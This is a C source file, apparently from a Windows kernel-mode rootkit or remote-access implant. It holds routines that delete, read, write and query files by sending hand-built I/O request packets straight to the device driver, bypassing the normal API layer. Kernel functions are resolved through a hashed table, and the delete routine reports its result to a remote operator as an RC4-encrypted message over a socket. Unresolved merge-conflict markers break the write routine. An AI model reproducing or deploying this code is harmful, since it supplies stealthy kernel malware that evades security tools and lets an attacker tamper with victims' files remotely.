#include "common.h"

/*////////////////////////////////////////////////////
//
//	File: rwqueryfilevol.c
//
//	Support routines for file deletion
//	file/volume information and reading
//	/writing 
//	All functions calling underlying driver
//	directly instead of using Zw/Nt Functions
//
//
*/////////////////////////////////////////////////////

NTSTATUS IopDeleteFile(IN PFILE_OBJECT socket, IN PCHAR FileName)
{
	NTSTATUS st;
	HANDLE handle;
	OBJECT_ATTRIBUTES oa					= { 0 };
	UNICODE_STRING ustr1					= { 0 };
	ANSI_STRING ansi						= { 0 };
	IO_STATUS_BLOCK io						= { 0 };
	KEVENT Event;
	PIRP Irp								= NULL;
	PIO_STACK_LOCATION pio					= NULL;
	PFILE_OBJECT FileObject					= NULL;
	PDEVICE_OBJECT Device					= NULL;
	FILE_DISPOSITION_INFORMATION filedis	= { 0 };
	rc4_ctx ctx								= { 0 };
	char out[50]							= { 0 };

	char *msg = "[*] File successfully deleted";
	unsigned long length = kistrlen(msg);

	g_Hash._RtlInitAnsiString(&ansi, FileName);
	g_Hash._RtlAnsiStringToUnicodeString(&ustr1, &ansi, TRUE);
	InitializeObjectAttributes(&oa,
		&ustr1,
		OBJ_CASE_INSENSITIVE |
		OBJ_KERNEL_HANDLE,
		NULL,
		NULL);

#ifndef _WIN64 && WINVER == _WIN32_WINNT_WIN7

	st = MyIopCreateFile(&handle, \
		FILE_READ_ATTRIBUTES, \
		&oa, \
		&io, \
		0, \
		FILE_ATTRIBUTE_NORMAL, \
		FILE_SHARE_DELETE, \
		FILE_OPEN, \
		FILE_NON_DIRECTORY_FILE |
		FILE_SYNCHRONOUS_IO_NONALERT, \
		NULL, \
		0, \
		CreateFileTypeNone,
		NULL, \
		IO_NO_PARAMETER_CHECKING, \
		0, \
		NULL);

#else

	st = IoCreateFileEx(&handle, FILE_READ_ATTRIBUTES, &oa, &io, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_DELETE, FILE_OPEN,
		FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0, CreateFileTypeNone, NULL, IO_NO_PARAMETER_CHECKING, 0, NULL);
#endif

	if (NT_SUCCESS(st))
	{
		st = g_Hash._ObReferenceObjectByHandle(handle, DELETE, *g_Hash._IoFileObjectType, KernelMode, (PVOID*)&FileObject, NULL);
		if (NT_SUCCESS(st))
		{
			Device = g_Hash._IoGetRelatedDeviceObject(FileObject);
			if (Device)
			{
				Irp = g_Hash._IoAllocateIrp(Device->StackSize, FALSE);
				if (Irp)
				{
					filedis.DeleteFile = TRUE;

					g_Hash._KeInitializeEvent(&Event, SynchronizationEvent, FALSE);

					Irp->AssociatedIrp.SystemBuffer = &filedis;
					Irp->RequestorMode = KernelMode;
					Irp->Flags = 0;
					Irp->UserIosb = &io;
					Irp->UserEvent = &Event;
					Irp->Tail.Overlay.Thread = (PKTHREAD)g_Hash._KeGetCurrentThread();
					Irp->Tail.Overlay.OriginalFileObject = FileObject;

					pio = Irp->Tail.Overlay.CurrentStackLocation - 1;
					pio->DeviceObject = Device;
					pio->FileObject = FileObject;
					pio->MajorFunction = IRP_MJ_SET_INFORMATION;
					pio->Parameters.SetFile.Length = sizeof(FILE_DISPOSITION_INFORMATION);
					pio->Parameters.SetFile.FileInformationClass = FileDispositionInformation;

					IoSetCompletionRoutine(Irp, QueryCompletion, NULL, TRUE, TRUE, TRUE);

					st = g_Hash._IofCallDriver(Device, Irp);
					if (st == STATUS_PENDING)
						g_Hash._KeWaitForSingleObject(&Event, Executive, KernelMode, TRUE, NULL);


					rc4_init(&ctx, key1, sizeof(key1));
					rc4_encrypt(&ctx, (const uint8*)msg, (uint8*)out, length);

					send(socket, out, length);
				}
			}
			g_Hash._ObfDereferenceObject(FileObject);
		}
#ifndef _WIN64
		ObpCloseHandle(handle, KernelMode);
#else
		ZwClose(handle);
#endif
	}

	g_Hash._RtlFreeUnicodeString(&ustr1);

	return st;
}

NTSTATUS IopQueryFileInformation(IN HANDLE FileHandle, OUT PVOID FileInformation, IN ULONG Length, IN FILE_INFORMATION_CLASS InfoClass)
{

	NTSTATUS st;
	KEVENT Event;
	PIRP Irp = NULL;
	PFILE_OBJECT FileObject = NULL;
	PDEVICE_OBJECT DeviceObject = NULL;
	PIO_STACK_LOCATION pio = NULL;
	IO_STATUS_BLOCK io;

	st = g_Hash._ObReferenceObjectByHandle(FileHandle, FILE_GENERIC_READ, *g_Hash._IoFileObjectType, KernelMode, (PVOID*)&FileObject, NULL);
	if (NT_SUCCESS(st))
	{
		DeviceObject = g_Hash._IoGetRelatedDeviceObject(FileObject);
		if (DeviceObject)
		{
			Irp = g_Hash._IoAllocateIrp(DeviceObject->StackSize, FALSE);
			if (Irp)
			{
				g_Hash._KeInitializeEvent(&Event, SynchronizationEvent, FALSE);

				memset(FileInformation, 0, Length);
				Irp->AssociatedIrp.SystemBuffer = FileInformation;
				Irp->UserEvent = &Event;
				Irp->UserIosb = &io;
				Irp->RequestorMode = KernelMode;
				Irp->Tail.Overlay.Thread = (PETHREAD)g_Hash._KeGetCurrentThread();
				Irp->Tail.Overlay.OriginalFileObject = FileObject;

				pio = Irp->Tail.Overlay.CurrentStackLocation - 1;
				pio->DeviceObject = DeviceObject;
				pio->FileObject = FileObject;
				pio->MajorFunction = IRP_MJ_QUERY_INFORMATION;
				pio->Parameters.QueryFile.Length = Length;
				pio->Parameters.QueryFile.FileInformationClass = InfoClass;

				IoSetCompletionRoutine(Irp, QueryCompletion, NULL, TRUE, TRUE, TRUE);

				st = g_Hash._IofCallDriver(DeviceObject, Irp);
				if (st == STATUS_PENDING)
					st = g_Hash._KeWaitForSingleObject(&Event, Executive, KernelMode, TRUE, NULL);

			}
		}
		g_Hash._ObfDereferenceObject(FileObject);
	}

	st = io.Status;

	return st;

}

NTSTATUS IopQueryVolumeInformationFile(IN HANDLE Handle, OUT PVOID VolumeInformation, IN ULONG Length, IN FS_INFORMATION_CLASS InfoClass)
{

	NTSTATUS st;
	KEVENT Event;
	PIRP Irp = NULL;
	PFILE_OBJECT FileObject = NULL;
	PDEVICE_OBJECT DeviceObject = NULL;
	PIO_STACK_LOCATION pio = NULL;
	IO_STATUS_BLOCK io;

	st = g_Hash._ObReferenceObjectByHandle(Handle,
		FILE_GENERIC_READ,
		*g_Hash._IoFileObjectType,
		KernelMode,
		(PVOID*)&FileObject,
		NULL);
	if (NT_SUCCESS(st))
	{
		DeviceObject = g_Hash._IoGetRelatedDeviceObject(FileObject);
		if (DeviceObject)
		{
			Irp = g_Hash._IoAllocateIrp(DeviceObject->StackSize, FALSE);
			if (Irp)
			{
				g_Hash._KeInitializeEvent(&Event, SynchronizationEvent, FALSE);

				memset(VolumeInformation, 0, Length);
				Irp->AssociatedIrp.SystemBuffer = VolumeInformation;
				Irp->UserEvent = &Event;
				Irp->UserIosb = &io;
				Irp->RequestorMode = KernelMode;
				Irp->Tail.Overlay.Thread = (PETHREAD)g_Hash._KeGetCurrentThread();
				Irp->Tail.Overlay.OriginalFileObject = FileObject;

				pio = Irp->Tail.Overlay.CurrentStackLocation - 1;
				pio->DeviceObject = DeviceObject;
				pio->FileObject = FileObject;
				pio->MajorFunction = IRP_MJ_QUERY_VOLUME_INFORMATION;
				pio->Parameters.QueryFile.Length = Length;
				pio->Parameters.QueryFile.FileInformationClass = InfoClass;

				IoSetCompletionRoutine(Irp, QueryCompletion, NULL, TRUE, TRUE, TRUE);

				st = g_Hash._IofCallDriver(DeviceObject, Irp);
				if (st == STATUS_PENDING)
					g_Hash._KeWaitForSingleObject(&Event, Executive, KernelMode, TRUE, NULL);
			}
		}
		g_Hash._ObfDereferenceObject(FileObject);
	}

	st = io.Status;

	return st;

}


NTSTATUS IopGetFileSize(IN HANDLE Handle, OUT PLARGE_INTEGER Size)
{
	NTSTATUS st;
	FILE_STANDARD_INFORMATION fileinfo = { 0 };

	st = IopQueryFileInformation(Handle, &fileinfo, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
	if (NT_SUCCESS(st))
	{

		Size->HighPart = fileinfo.EndOfFile.HighPart;
		Size->LowPart = fileinfo.EndOfFile.LowPart;
		Size->QuadPart = fileinfo.EndOfFile.QuadPart;
	}

	return st;

}


NTSTATUS IopReadFile(IN HANDLE handle, OUT PIO_STATUS_BLOCK IoStatusBlock, OUT PVOID Buffer, IN ULONG Length, IN PLARGE_INTEGER ByteOffset OPTIONAL)
{
	PIRP Irp = NULL;
	NTSTATUS st;
	KEVENT Event;
	PIO_STACK_LOCATION pio = NULL;
	PFILE_OBJECT FileObject = NULL;

	st = g_Hash._ObReferenceObjectByHandle(handle, FILE_GENERIC_READ, *g_Hash._IoFileObjectType, KernelMode, &FileObject, NULL);
	if (!NT_SUCCESS(st))
	{
		KdPrint(("\r\nError ObReferenceObjectByHandle IopReadFile: 0x%x"), st);
		g_Hash._ObfDereferenceObject(FileObject);
		return STATUS_INVALID_HANDLE;
	}

	if (FileObject->Vpb == 0 || FileObject->Vpb->DeviceObject == NULL)
		return STATUS_UNSUCCESSFUL;

	if (ByteOffset == NULL)
	{
		if (!(FileObject->Flags & FO_SYNCHRONOUS_IO))
			return STATUS_INVALID_PARAMETER;
		ByteOffset = &FileObject->CurrentByteOffset;
	}

	Irp = g_Hash._IoAllocateIrp(FileObject->Vpb->DeviceObject->StackSize, FALSE);
	if (Irp == NULL)
		return STATUS_INSUFFICIENT_RESOURCES;

	memset(Buffer, 0, Length);

	if (FileObject->DeviceObject->Flags & DO_BUFFERED_IO)
	{
		Irp->AssociatedIrp.SystemBuffer = Buffer;
	}

	else if (FileObject->DeviceObject->Flags & DO_DIRECT_IO)
	{
		Irp->MdlAddress = g_Hash._IoAllocateMdl(Buffer, Length, 0, 0, 0);
		if (Irp->MdlAddress == NULL)
		{
			g_Hash._IoFreeIrp(Irp);
			return STATUS_INSUFFICIENT_RESOURCES;
		}

		g_Hash._MmBuildMdlForNonPagedPool(Irp->MdlAddress);
	}
	else
	{
		Irp->UserBuffer = Buffer;
	}

	g_Hash._KeInitializeEvent(&Event, SynchronizationEvent, FALSE);

	Irp->UserEvent = &Event;
	Irp->UserIosb = IoStatusBlock;
	Irp->RequestorMode = KernelMode;
	Irp->Flags = IRP_READ_OPERATION;
	Irp->Tail.Overlay.Thread = (PKTHREAD)g_Hash._KeGetCurrentThread();
	Irp->Tail.Overlay.OriginalFileObject = FileObject;

	pio = Irp->Tail.Overlay.CurrentStackLocation - 1;
	pio->MajorFunction = IRP_MJ_READ;
	pio->MinorFunction = IRP_MN_NORMAL;
	pio->DeviceObject = FileObject->Vpb->DeviceObject;
	pio->FileObject = FileObject;
	pio->Parameters.Read.Length = Length;
	pio->Parameters.Read.ByteOffset = *ByteOffset;

	IoSetCompletionRoutine(Irp, QueryCompletion, NULL, TRUE, TRUE, TRUE);
	st = g_Hash._IofCallDriver(FileObject->Vpb->DeviceObject, Irp);
	if (st == STATUS_PENDING)
		g_Hash._KeWaitForSingleObject(&Event, Executive, KernelMode, TRUE, 0);

	return IoStatusBlock->Status;
}

<<<<<<< HEAD
NTSTATUS IopWriteFile(IN HANDLE Handle, OUT PIO_STATUS_BLOCK IoStatusBlock, OUT PVOID Buffer, IN ULONG Length, IN PLARGE_INTEGER ByteOffset OPTIONAL)
=======
NTSTATUS IopWriteFile(IN HANDLE Handle, IN ACCESS_MASK DesiredAccess, OUT PIO_STATUS_BLOCK IoStatusBlock, OUT PVOID Buffer, IN ULONG Length, IN PLARGE_INTEGER ByteOffset OPTIONAL)
>>>>>>> adding files
{
	PIRP Irp = NULL;
	NTSTATUS st;
	KEVENT Event;
	PFILE_OBJECT FileObject = NULL;
	PIO_STACK_LOCATION pio = NULL;

<<<<<<< HEAD
	st = g_Hash._ObReferenceObjectByHandle(Handle, FILE_GENERIC_WRITE, *g_Hash._IoFileObjectType, KernelMode, (PVOID*)&FileObject, NULL);
=======
	st = g_Hash._ObReferenceObjectByHandle(Handle, DesiredAccess, *g_Hash._IoFileObjectType, KernelMode, (PVOID*)&FileObject, NULL);
>>>>>>> adding files
	if (!NT_SUCCESS(st))
	{
		KdPrint(("\r\nObReferenceObjectByHandle Error IopWriteFile: 0x%x"), st);
		g_Hash._ObfDereferenceObject(FileObject);
		return STATUS_INVALID_HANDLE;
	}

	if (FileObject->Vpb == 0 || FileObject->Vpb->DeviceObject == NULL)
		return STATUS_UNSUCCESSFUL;

	if (ByteOffset == NULL)
	{
		if (!(FileObject->Flags & FO_SYNCHRONOUS_IO))
			return STATUS_INVALID_PARAMETER;
		ByteOffset = &FileObject->CurrentByteOffset;
	}

	Irp = g_Hash._IoAllocateIrp(FileObject->Vpb->DeviceObject->StackSize, FALSE);
	if (Irp == NULL)
		return STATUS_INSUFFICIENT_RESOURCES;

	if (FileObject->DeviceObject->Flags & DO_BUFFERED_IO)
	{
		Irp->AssociatedIrp.SystemBuffer = Buffer;
	}
	else
	{
		Irp->MdlAddress = g_Hash._IoAllocateMdl(Buffer, Length, 0, 0, 0);
		if (Irp->MdlAddress == NULL)
		{
			g_Hash._IoFreeIrp(Irp);
			return STATUS_INSUFFICIENT_RESOURCES;
		}

		g_Hash._MmBuildMdlForNonPagedPool(Irp->MdlAddress);
	}


	g_Hash._KeInitializeEvent(&Event, SynchronizationEvent, FALSE);

	Irp->UserEvent = &Event;
	Irp->UserIosb = IoStatusBlock;
	Irp->RequestorMode = KernelMode;
	Irp->Flags = IRP_WRITE_OPERATION;
	Irp->Tail.Overlay.Thread = (PKTHREAD)g_Hash._KeGetCurrentThread();
	Irp->Tail.Overlay.OriginalFileObject = FileObject;

	pio = Irp->Tail.Overlay.CurrentStackLocation - 1;
	pio->MajorFunction = IRP_MJ_WRITE;
	pio->MinorFunction = IRP_MN_NORMAL;
	pio->DeviceObject = FileObject->Vpb->DeviceObject;
	pio->FileObject = FileObject;
	pio->Parameters.Write.Length = Length;
	pio->Parameters.Write.ByteOffset = *ByteOffset;

	IoSetCompletionRoutine(Irp, QueryCompletion, NULL, TRUE, TRUE, TRUE);
	st = g_Hash._IofCallDriver(FileObject->Vpb->DeviceObject, Irp);
	if (st == STATUS_PENDING)
	{
		g_Hash._KeWaitForSingleObject(&Event, Executive, KernelMode, TRUE, NULL);
	}

	return IoStatusBlock->Status;

}
